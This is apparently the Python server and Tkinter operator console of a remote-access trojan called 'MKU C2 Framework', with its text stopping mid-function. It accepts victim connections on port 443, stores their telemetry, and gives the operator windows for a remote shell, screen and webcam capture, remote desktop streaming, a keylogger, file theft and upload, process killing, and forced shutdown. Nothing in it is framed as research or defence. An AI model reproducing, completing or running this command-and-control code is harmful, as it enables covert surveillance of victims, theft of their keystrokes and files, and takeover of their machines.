import socket
import os
import threading
import time
import json
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from queue import Queue, Empty
import cv2
import numpy as np
import base64
from PIL import Image, ImageTk
import io

# Inicializar filas para comunicação entre threads
log_queue = Queue()
clientes = {}
clientes_lock = threading.Lock()
nomes_usados = {}
update_gui_event = threading.Event()

IP = "0.0.0.0"
PORTA = 443
DELIMITADOR = b"|||FIM|||"

def salvar_telemetria(dados, addr):
    diretorio = "telemetria"
    if not os.path.exists(diretorio):
        os.makedirs(diretorio)
    
    nome_arquivo = f"{diretorio}/telemetria_{addr[0]}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(nome_arquivo, 'wb') as f:
        f.write(dados)
    log_queue.put(f"[+] Telemetria salva: {nome_arquivo}")

def enviar_comando(conn, comando):
    try:
        conn.sendall(comando.encode() + DELIMITADOR)
    except Exception as e:
        log_queue.put(f"[!] Erro ao enviar comando: {e}")
        raise

def receber_resposta(conn, tamanho_max=1048576):
    dados = b""
    while True:
        try:
            parte = conn.recv(4096)
            if not parte:
                break
            dados += parte
            if DELIMITADOR in dados:
                break
            if len(dados) > tamanho_max:
                raise Exception("Resposta muito grande")
        except socket.timeout:
            break
        except Exception as e:
            log_queue.put(f"[!] Erro ao receber resposta: {e}")
            break
    return dados.replace(DELIMITADOR, b"")

def gerenciar_cliente(conn, addr):
    global clientes, nomes_usados
    id_cliente = None
    try:
        conn.settimeout(30)
        telemetria = receber_resposta(conn)
        salvar_telemetria(telemetria, addr)
        
        try:
            telemetria_json = json.loads(telemetria.decode('utf-8', errors='replace'))
            usuario = telemetria_json.get('usuario', 'Desconhecido')
            with clientes_lock:
                if usuario in nomes_usados:
                    nomes_usados[usuario] += 1
                    id_cliente = f"{usuario}_{nomes_usados[usuario]}"
                else:
                    nomes_usados[usuario] = 0
                    id_cliente = usuario
                clientes[id_cliente] = {
                    'conn': conn,
                    'addr': addr,
                    'timestamp': time.time(),
                    'telemetria': telemetria_json
                }
        except json.JSONDecodeError:
            with clientes_lock:
                usuario = 'Desconhecido'
                nomes_usados[usuario] = nomes_usados.get(usuario, 0) + 1
                id_cliente = f"{usuario}_{nomes_usados[usuario]}"
                clientes[id_cliente] = {
                    'conn': conn,
                    'addr': addr,
                    'timestamp': time.time(),
                    'telemetria': {}
                }
        
        log_queue.put(f"[+] Conexão com {id_cliente} ({addr})")
        update_gui_event.set()
        
        while True:
            with clientes_lock:
                if id_cliente not in clientes:
                    break
            time.sleep(1)
    except Exception as e:
        log_queue.put(f"[!] Erro com {id_cliente or 'Desconhecido'} ({addr}): {e}")
    finally:
        with clientes_lock:
            if id_cliente and id_cliente in clientes:
                del clientes[id_cliente]
        conn.close()
        log_queue.put(f"[*] Conexão com {id_cliente or 'Desconhecido'} ({addr}) encerrada")
        update_gui_event.set()

def aceitar_conexoes(servidor):
    while True:
        try:
            conn, addr = servidor.accept()
            threading.Thread(target=gerenciar_cliente, args=(conn, addr), daemon=True).start()
        except Exception as e:
            log_queue.put(f"[!] Erro ao aceitar conexão: {e}")

class ShellWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Shell Remota - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        
        self.output = scrolledtext.ScrolledText(self.window, height=15, bg="#2a2a2a", fg="#00ff00", font=("Courier New", 10), insertbackground="white")
        self.output.pack(fill="both", expand=True, padx=5, pady=5)
        self.output.config(state="disabled")
        
        self.input = tk.Entry(self.window, bg="#2a2a2a", fg="#ffffff", font=("Courier New", 10), insertbackground="white", bd=1, relief="solid")
        self.input.pack(fill="x", padx=5, pady=5)
        self.input.bind("<Return>", self.enviar_comando)
        self.input.focus()
        
        self.output.config(state="normal")
        self.output.insert(tk.END, f"[*] Shell remota com {cliente_id}\n")
        self.output.config(state="disabled")
        
    def enviar_comando(self, event):
        comando = self.input.get().strip()
        self.input.delete(0, tk.END)
        if not comando:
            return
        if comando.lower() in ['exit', 'quit']:
            self.window.destroy()
            return
        self.output.config(state="normal")
        self.output.insert(tk.END, f"MKU@{self.cliente_id}:# {comando}\n")
        self.output.config(state="disabled")
        try:
            enviar_comando(self.conn, comando)
            resposta = receber_resposta(self.conn)
            resposta_texto = resposta.decode('utf-8', errors='replace')
            self.output.config(state="normal")
            self.output.insert(tk.END, f"{resposta_texto}\n")
            self.output.config(state="disabled")
            self.output.see(tk.END)
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao executar comando: {e}")
            self.window.destroy()

class RemoteDesktopWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Remote Desktop - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        self.running = True
        
        self.canvas = tk.Canvas(self.window, bg="#2a2a2a")
        self.canvas.pack(fill="both", expand=True)
        self.image_label = tk.Label(self.canvas, bg="#2a2a2a")
        self.image_label.pack()
        
        self.window.protocol("WM_DELETE_WINDOW", self.fechar)
        threading.Thread(target=self.receber_stream, daemon=True).start()
        
    def receber_stream(self):
        try:
            enviar_comando(self.conn, "REMOTE_DESKTOP")
            while self.running:
                resposta = receber_resposta(self.conn)
                if not resposta:
                    break
                dados = json.loads(resposta.decode('utf-8', errors='replace'))
                if dados.get('erro'):
                    messagebox.showerror("Erro", dados['erro'])
                    break
                img_data = base64.b64decode(dados['frame'])
                img = Image.open(io.BytesIO(img_data))
                photo = ImageTk.PhotoImage(img)
                self.image_label.configure(image=photo)
                self.image_label.image = photo
                time.sleep(0.1)
        except Exception as e:
            messagebox.showerror("Erro", f"Falha no Remote Desktop: {e}")
            self.fechar()

    def fechar(self):
        self.running = False
        self.window.destroy()

class FileManagerWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"File Manager - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        self.current_path = ""
        
        self.file_tree = ttk.Treeview(self.window, columns=("Nome", "Tipo", "Tamanho"), show="headings")
        self.file_tree.heading("Nome", text="Nome")
        self.file_tree.heading("Tipo", text="Tipo")
        self.file_tree.heading("Tamanho", text="Tamanho")
        self.file_tree.column("Nome", width=200)
        self.file_tree.column("Tipo", width=100)
        self.file_tree.column("Tamanho", width=100)
        self.file_tree.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.button_frame = tk.Frame(self.window, bg="#1a1a1a")
        self.button_frame.pack(fill="x", pady=5)
        tk.Button(self.button_frame, text="Atualizar", command=self.listar_arquivos, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        tk.Button(self.button_frame, text="Download", command=self.download_arquivo, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        tk.Button(self.button_frame, text="Upload", command=self.upload_arquivo, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        tk.Button(self.button_frame, text="Excluir", command=self.excluir_arquivo, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        
        self.file_tree.bind("<Double-1>", self.navegar_diretorio)
        self.listar_arquivos()
        
    def listar_arquivos(self):
        try:
            enviar_comando(self.conn, f"FILE_LIST {self.current_path}")
            resposta = receber_resposta(self.conn)
            arquivos = json.loads(resposta.decode('utf-8', errors='replace'))
            self.file_tree.delete(*self.file_tree.get_children())
            for arquivo in arquivos:
                self.file_tree.insert("", "end", values=(
                    arquivo['nome'],
                    arquivo['tipo'],
                    arquivo['tamanho']
                ))
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao listar arquivos: {e}")

    def navegar_diretorio(self, event):
        selecionado = self.file_tree.selection()
        if selecionado:
            item = self.file_tree.item(selecionado[0])
            nome = item['values'][0]
            tipo = item['values'][1]
            if tipo == "Diretório":
                self.current_path = os.path.join(self.current_path, nome)
                self.listar_arquivos()

    def download_arquivo(self):
        selecionado = self.file_tree.selection()
        if selecionado:
            item = self.file_tree.item(selecionado[0])
            nome = item['values'][0]
            caminho = os.path.join(self.current_path, nome)
            try:
                enviar_comando(self.conn, f"FILE_DOWNLOAD {caminho}")
                resposta = receber_resposta(self.conn)
                dados = json.loads(resposta.decode('utf-8', errors='replace'))
                if dados.get('erro'):
                    messagebox.showerror("Erro", dados['erro'])
                else:
                    destino = filedialog.asksaveasfilename(initialfile=nome)
                    if destino:
                        with open(destino, 'wb') as f:
                            f.write(base64.b64decode(dados['conteudo']))
                        messagebox.showinfo("Sucesso", "Arquivo baixado com sucesso")
            except Exception as e:
                messagebox.showerror("Erro", f"Falha ao baixar arquivo: {e}")

    def upload_arquivo(self):
        origem = filedialog.askopenfilename()
        if origem:
            nome = os.path.basename(origem)
            destino = os.path.join(self.current_path, nome)
            try:
                with open(origem, 'rb') as f:
                    conteudo = base64.b64encode(f.read()).decode('utf-8')
                enviar_comando(self.conn, f"FILE_UPLOAD {destino} {conteudo}")
                resposta = receber_resposta(self.conn)
                dados = json.loads(resposta.decode('utf-8', errors='replace'))
                if dados.get('erro'):
                    messagebox.showerror("Erro", dados['erro'])
                else:
                    messagebox.showinfo("Sucesso", "Arquivo enviado com sucesso")
                    self.listar_arquivos()
            except Exception as e:
                messagebox.showerror("Erro", f"Falha ao enviar arquivo: {e}")

    def excluir_arquivo(self):
        selecionado = self.file_tree.selection()
        if selecionado:
            item = self.file_tree.item(selecionado[0])
            nome = item['values'][0]
            caminho = os.path.join(self.current_path, nome)
            if messagebox.askyesno("Confirmar", f"Excluir {nome}?"):
                try:
                    enviar_comando(self.conn, f"FILE_DELETE {caminho}")
                    resposta = receber_resposta(self.conn)
                    dados = json.loads(resposta.decode('utf-8', errors='replace'))
                    if dados.get('erro'):
                        messagebox.showerror("Erro", dados['erro'])
                    else:
                        messagebox.showinfo("Sucesso", "Arquivo excluído com sucesso")
                        self.listar_arquivos()
                except Exception as e:
                    messagebox.showerror("Erro", f"Falha ao excluir arquivo: {e}")

class WebcamCaptureWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Webcam Capture - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        
        self.image_label = tk.Label(self.window, bg="#2a2a2a")
        self.image_label.pack(fill="both", expand=True)
        
        self.button_frame = tk.Frame(self.window, bg="#1a1a1a")
        self.button_frame.pack(fill="x", pady=5)
        tk.Button(self.button_frame, text="Capturar", command=self.capturar, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        
        self.capturar()
        
    def capturar(self):
        try:
            enviar_comando(self.conn, "WEBCAM_CAPTURE")
            resposta = receber_resposta(self.conn)
            dados = json.loads(resposta.decode('utf-8', errors='replace'))
            if dados.get('erro'):
                messagebox.showerror("Erro", dados['erro'])
            else:
                img_data = base64.b64decode(dados['imagem'])
                img = Image.open(io.BytesIO(img_data))
                photo = ImageTk.PhotoImage(img)
                self.image_label.configure(image=photo)
                self.image_label.image = photo
                messagebox.showinfo("Sucesso", "Imagem capturada")
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao capturar webcam: {e}")

class KeyloggerWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Keylogger - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        self.running = True
        
        self.output = scrolledtext.ScrolledText(self.window, height=20, bg="#2a2a2a", fg="#00ff00", font=("Courier New", 10))
        self.output.pack(fill="both", expand=True, padx=5, pady=5)
        self.output.config(state="disabled")
        
        self.window.protocol("WM_DELETE_WINDOW", self.fechar)
        threading.Thread(target=self.receber_keylog, daemon=True).start()
        
        try:
            enviar_comando(self.conn, "KEYLOGGER_START")
            resposta = receber_resposta(self.conn)
            dados = json.loads(resposta.decode('utf-8', errors='replace'))
            if dados.get('erro'):
                messagebox.showerror("Erro", dados['erro'])
                self.fechar()
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao iniciar keylogger: {e}")
            self.fechar()
        
    def receber_keylog(self):
        try:
            while self.running:
                resposta = receber_resposta(self.conn)
                if not resposta:
                    break
                dados = json.loads(resposta.decode('utf-8', errors='replace'))
                if dados.get('tecla'):
                    self.output.config(state="normal")
                    self.output.insert(tk.END, dados['tecla'] + "\n")
                    self.output.config(state="disabled")
                    self.output.see(tk.END)
        except Exception as e:
            messagebox.showerror("Erro", f"Falha no keylogger: {e}")
            self.fechar()
        
    def fechar(self):
        self.running = False
        self.window.destroy()

class ProcessManagerWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Process Manager - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        
        self.process_tree = ttk.Treeview(self.window, columns=("PID", "Nome", "CPU", "Memória"), show="headings")
        self.process_tree.heading("PID", text="PID")
        self.process_tree.heading("Nome", text="Nome")
        self.process_tree.heading("CPU", text="CPU (%)")
        self.process_tree.heading("Memória", text="Memória (MB)")
        self.process_tree.column("PID", width=80)
        self.process_tree.column("Nome", width=200)
        self.process_tree.column("CPU", width=100)
        self.process_tree.column("Memória", width=100)
        self.process_tree.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.button_frame = tk.Frame(self.window, bg="#1a1a1a")
        self.button_frame.pack(fill="x", pady=5)
        tk.Button(self.button_frame, text="Atualizar", command=self.listar_processos, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        tk.Button(self.button_frame, text="Finalizar", command=self.finalizar_processo, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        
        self.listar_processos()
        
    def listar_processos(self):
        try:
            enviar_comando(self.conn, "PROCESS_LIST")
            resposta = receber_resposta(self.conn)
            processos = json.loads(resposta.decode('utf-8', errors='replace'))
            self.process_tree.delete(*self.process_tree.get_children())
            for proc in processos:
                self.process_tree.insert("", "end", values=(
                    proc['pid'],
                    proc['nome'],
                    proc['cpu'],
                    proc['memoria']
                ))
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao listar processos: {e}")

    def finalizar_processo(self):
        selecionado = self.process_tree.selection()
        if selecionado:
            item = self.process_tree.item(selecionado[0])
            pid = item['values'][0]
            if messagebox.askyesno("Confirmar", f"Finalizar processo PID {pid}?"):
                try:
                    enviar_comando(self.conn, f"PROCESS_KILL {pid}")
                    resposta = receber_resposta(self.conn)
                    dados = json.loads(resposta.decode('utf-8', errors='replace'))
                    if dados.get('erro'):
                        messagebox.showerror("Erro", dados['erro'])
                    else:
                        messagebox.showinfo("Sucesso", "Processo finalizado")
                        self.listar_processos()
                except Exception as e:
                    messagebox.showerror("Erro", f"Falha ao finalizar processo: {e}")

class ScreenCaptureWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Screen Capture - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        
        self.image_label = tk.Label(self.window, bg="#2a2a2a")
        self.image_label.pack(fill="both", expand=True)
        
        self.button_frame = tk.Frame(self.window, bg="#1a1a1a")
        self.button_frame.pack(fill="x", pady=5)
        tk.Button(self.button_frame, text="Capturar", command=self.capturar, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(side="left", padx=5)
        
        self.capturar()
        
    def capturar(self):
        try:
            enviar_comando(self.conn, "SCREEN_CAPTURE")
            resposta = receber_resposta(self.conn)
            dados = json.loads(resposta.decode('utf-8', errors='replace'))
            if dados.get('erro'):
                messagebox.showerror("Erro", dados['erro'])
            else:
                img_data = base64.b64decode(dados['screenshot'])
                img = Image.open(io.BytesIO(img_data))
                photo = ImageTk.PhotoImage(img)
                self.image_label.configure(image=photo)
                self.image_label.image = photo
                messagebox.showinfo("Sucesso", "Screenshot capturado")
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao capturar tela: {e}")

class SystemInfoWindow:
    def __init__(self, parent, cliente_id, telemetria):
        self.window = tk.Toplevel(parent)
        self.window.title(f"System Info - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        
        self.text = scrolledtext.ScrolledText(self.window, height=20, bg="#2a2a2a", fg="#ffffff", font=("Courier New", 10))
        self.text.pack(fill="both", expand=True, padx=5, pady=5)
        self.text.config(state="normal")
        info = "\n".join([f"{k}: {v}" for k, v in telemetria.items()])
        self.text.insert(tk.END, info)
        self.text.config(state="disabled")

class PowerOptionsWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Power Options - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        
        self.label = tk.Label(self.window, text="Selecione uma opção:", font=("Courier New", 12), fg="#ff0000", bg="#1a1a1a")
        self.label.pack(pady=10)
        
        tk.Button(self.window, text="Desligar", command=self.desligar, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(pady=5)
        tk.Button(self.window, text="Reiniciar", command=self.reiniciar, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(pady=5)
        
    def desligar(self):
        try:
            enviar_comando(self.conn, "POWER_SHUTDOWN")
            resposta = receber_resposta(self.conn)
            dados = json.loads(resposta.decode('utf-8', errors='replace'))
            if dados.get('erro'):
                messagebox.showerror("Erro", dados['erro'])
            else:
                messagebox.showinfo("Sucesso", "Comando de desligar enviado")
            self.window.destroy()
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao executar desligar: {e}")
            self.window.destroy()

    def reiniciar(self):
        try:
            enviar_comando(self.conn, "POWER_REBOOT")
            resposta = receber_resposta(self.conn)
            dados = json.loads(resposta.decode('utf-8', errors='replace'))
            if dados.get('erro'):
                messagebox.showerror("Erro", dados['erro'])
            else:
                messagebox.showinfo("Sucesso", "Comando de reiniciar enviado")
            self.window.destroy()
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao executar reiniciar: {e}")
            self.window.destroy()

class MessageBoxWindow:
    def __init__(self, parent, cliente_id, conn):
        self.window = tk.Toplevel(parent)
        self.window.title(f"Message Box - {cliente_id}")
        self.window.configure(bg="#1a1a1a")
        self.cliente_id = cliente_id
        self.conn = conn
        
        self.label = tk.Label(self.window, text="Digite a mensagem:", font=("Courier New", 12), fg="#ff0000", bg="#1a1a1a")
        self.label.pack(pady=10)
        
        self.entry = tk.Entry(self.window, bg="#2a2a2a", fg="#ffffff", font=("Courier New", 10), insertbackground="white", bd=1, relief="solid")
        self.entry.pack(padx=10, pady=5)
        
        tk.Button(self.window, text="Enviar", command=self.enviar, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid").pack(pady=10)
        
        self.entry.focus()
        
    def enviar(self):
        mensagem = self.entry.get().strip()
        if not mensagem:
            messagebox.showwarning("Aviso", "Digite uma mensagem")
            return
        try:
            enviar_comando(self.conn, f"MESSAGE_BOX {mensagem}")
            resposta = receber_resposta(self.conn)
            dados = json.loads(resposta.decode('utf-8', errors='replace'))
            if dados.get('erro'):
                messagebox.showerror("Erro", dados['erro'])
            else:
                messagebox.showinfo("Sucesso", "Mensagem enviada")
            self.window.destroy()
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao exibir message box: {e}")
            self.window.destroy()

class MKUC2GUI:
    def __init__(self, root):
        self.root = root
        self.root.title("MKU C2 Framework")
        self.root.configure(bg="#0a0a0a")
        self.root.geometry("900x700")
        
        # Estilo personalizado
        style = ttk.Style()
        style.configure("Treeview", background="#2a2a2a", foreground="#ffffff", fieldbackground="#2a2a2a", font=('Courier New', 10))
        style.configure("Treeview.Heading", background="#ff0000", foreground="#000000", font=('Courier New', 10, 'bold'))
        style.map("Treeview", background=[('selected', '#ff3333')])
        
        # Banner
        self.banner = tk.Label(
            root,
            text="""╔══════════════════════════════════════════╗
║        MKU C2 Framework                  ║
║    Command & Control by Team MKU         ║
║ Desenvolved By:   V01d3 and Byt3_Sh4d0w  ║
╚══════════════════════════════════════════╝""",
            font=("Courier New", 12, "bold"),
            fg="#ff0000",
            bg="#0a0a0a",
            justify="center"
        )
        self.banner.pack(pady=10)
        
        self.main_frame = tk.Frame(root, bg="#0a0a0a")
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.client_frame = tk.Frame(self.main_frame, bg="#0a0a0a")
        self.client_frame.pack(fill="both", expand=True, padx=5)
        
        self.client_label = tk.Label(self.client_frame, text="Clientes Conectados", font=("Courier New", 12, "bold"), fg="#ff0000", bg="#0a0a0a")
        self.client_label.pack()
        
        self.client_tree = ttk.Treeview(
            self.client_frame,
            columns=("ID", "IP", "Porta", "Tempo"),
            show="headings",
            height=10
        )
        self.client_tree.heading("ID", text="Nome")
        self.client_tree.heading("IP", text="IP")
        self.client_tree.heading("Porta", text="Porta")
        self.client_tree.heading("Tempo", text="Tempo")
        self.client_tree.column("ID", width=150)
        self.client_tree.column("IP", width=100)
        self.client_tree.column("Porta", width=50)
        self.client_tree.column("Tempo", width=100)
        self.client_tree.pack(pady=5, fill="both", expand=True)
        
        self.context_menu = tk.Menu(self.client_tree, tearoff=0, bg="#2a2a2a", fg="#ff0000", font=("Courier New", 10))
        self.context_menu.add_command(label="Shell Remota", command=self.abrir_shell)
        self.context_menu.add_command(label="Remote Desktop", command=self.iniciar_remote_desktop)
        self.context_menu.add_command(label="File Manager", command=self.abrir_file_manager)
        self.context_menu.add_command(label="Webcam Capture", command=self.capturar_webcam)
        self.context_menu.add_command(label="Keylogger", command=self.iniciar_keylogger)
        self.context_menu.add_command(label="Process Manager", command=self.abrir_process_manager)
        self.context_menu.add_command(label="Screen Capture", command=self.capturar_tela)
        self.context_menu.add_command(label="System Info", command=self.exibir_system_info)
        self.context_menu.add_command(label="Power Options", command=self.abrir_power_options)
        self.context_menu.add_command(label="Message Box", command=self.exibir_message_box)
        
        self.client_tree.bind("<Button-3>", self.mostrar_context_menu)
        self.client_tree.bind("<<TreeviewSelect>>", self.selecionar_cliente)
        
        self.log_frame = tk.Frame(self.main_frame, bg="#0a0a0a")
        self.log_frame.pack(fill="x", padx=5, pady=5)
        
        self.log_label = tk.Label(self.log_frame, text="Logs", font=("Courier New", 12, "bold"), fg="#ff0000", bg="#0a0a0a")
        self.log_label.pack()
        
        self.log_output = scrolledtext.ScrolledText(self.log_frame, height=8, bg="#2a2a2a", fg="#00ff00", font=("Courier New", 10), insertbackground="white")
        self.log_output.pack(fill="x", pady=5)
        self.log_output.config(state="disabled")
        
        self.button_frame = tk.Frame(self.main_frame, bg="#0a0a0a")
        self.button_frame.pack(fill="x", pady=5)
        
        self.status_button = tk.Button(self.button_frame, text="Status", command=self.exibir_status, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid")
        self.status_button.pack(side="left", padx=5)
        
        self.clear_button = tk.Button(self.button_frame, text="Limpar Logs", command=self.limpar_logs, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid")
        self.clear_button.pack(side="left", padx=5)
        
        self.quit_button = tk.Button(self.button_frame, text="Sair", command=self.sair, bg="#ff0000", fg="#ffffff", font=("Courier New", 10), bd=1, relief="solid")
        self.quit_button.pack(side="left", padx=5)
        
        self.cliente_selecionado = None
        self.atualizar_gui()
        
    def log(self, mensagem, cor="#00ff00"):
        self.log_output.config(state="normal")
        self.log_output.insert(tk.END, mensagem + "\n")
        self.log_output.config(state="disabled")
        self.log_output.see(tk.END)
        
    def exibir_status(self):
        with clientes_lock:
            self.log("═══════[ Status dos Clientes Ativos ]═══════")
            if not clientes:
                self.log("[*] Nenhum cliente conectado")
            else:
                for id_cliente, info in clientes.items():
                    tempo_conectado = time.time() - info['timestamp']
                    minutos = int(tempo_conectado // 60)
                    segundos = int(tempo_conectado % 60)
                    self.log(f"[{id_cliente}] - IP: {info['addr'][0]}, Porta: {info['addr'][1]}, Tempo: {minutos}m {segundos}s")
            self.log("═══════════════════════════════════════════")
        
    def limpar_logs(self):
        self.log_output.config(state="normal")
        self.log_output.delete(1.0, tk.END)
        self.log_output.config(state="disabled")
        
    def sair(self):
        self.root.quit()
        os._exit(0)
        
    def selecionar_cliente(self, event):
        selecionado = self.client_tree.selection()
        if selecionado:
            self.cliente_selecionado = self.client_tree.item(selecionado[0])["values"][0]
        # Não limpar self.cliente_selecionado se a seleção for removida
        
    def mostrar_context_menu(self, event):
        selecionado = self.client_tree.identify_row(event.y)
        if selecionado:
            self.client_tree.selection_set(selecionado)
            self.cliente_selecionado = self.client_tree.item(selecionado)["values"][0]
            self.context_menu.post(event.x_root, event.y_root)
        
    def abrir_shell(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Abrindo Shell Remota para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                ShellWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def iniciar_remote_desktop(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Iniciando Remote Desktop para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                RemoteDesktopWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def abrir_file_manager(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Abrindo File Manager para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                FileManagerWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def capturar_webcam(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Capturando webcam de {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                WebcamCaptureWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def iniciar_keylogger(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Iniciando keylogger para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                KeyloggerWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def abrir_process_manager(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Abrindo Process Manager para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                ProcessManagerWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def capturar_tela(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Capturando tela de {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                ScreenCaptureWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def exibir_system_info(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Exibindo System Info para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                telemetria = clientes[self.cliente_selecionado]['telemetria']
                SystemInfoWindow(self.root, self.cliente_selecionado, telemetria)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def abrir_power_options(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Abrindo Power Options para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                PowerOptionsWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def exibir_message_box(self):
        if not self.cliente_selecionado:
            self.log("[!] Selecione um cliente primeiro", cor="#ff3333")
            return
        self.log(f"[*] Exibindo Message Box para {self.cliente_selecionado}")
        with clientes_lock:
            if self.cliente_selecionado in clientes:
                conn = clientes[self.cliente_selecionado]['conn']
                MessageBoxWindow(self.root, self.cliente_selecionado, conn)
            else:
                self.log(f"[!] Cliente {self.cliente_selecionado} não está conectado", cor="#ff3333")
        
    def atualizar_gui(self):
        try:
            while True:
                try:
                    mensagem = log_queue.get_nowait()
                    self.log(mensagem)
                except Empty:
                    break
            with clientes_lock:
                for item in self.client_tree.get_children():
                    self.client_tree.delete(item)
                for id_cliente, info in clientes.items():
